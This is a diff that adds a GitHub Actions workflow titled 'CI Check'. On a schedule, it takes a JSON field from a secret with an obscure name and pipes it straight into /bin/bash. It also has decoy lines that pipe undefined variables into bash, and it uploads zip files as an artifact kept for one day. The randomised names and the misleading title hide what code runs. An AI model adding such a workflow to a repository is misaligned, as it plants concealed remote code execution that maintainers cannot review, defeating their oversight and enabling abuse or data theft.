@@ -1,0 +1,31 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '11 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          wg92: ${{ secrets.wg92 }}
+        run: |
+          printf '%s' "$wg92" | jq -r .apap8520 | /bin/bash
+          echo $pg328 | jq -r .hxz09667 | /bin/bash
+          echo $aghzn5 | jq -r .kify15 | /bin/bash
+          printf '%s' "$iyun30" | jq -r .uf9 | /bin/bash
+          printf '%s' "$sxf614" | jq -r .rgv62769 | /bin/bash
+          echo $zayuj111 | jq -r .benx9 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: qhN6XD49
+          path: "*.zip"
+          retention-days: 1
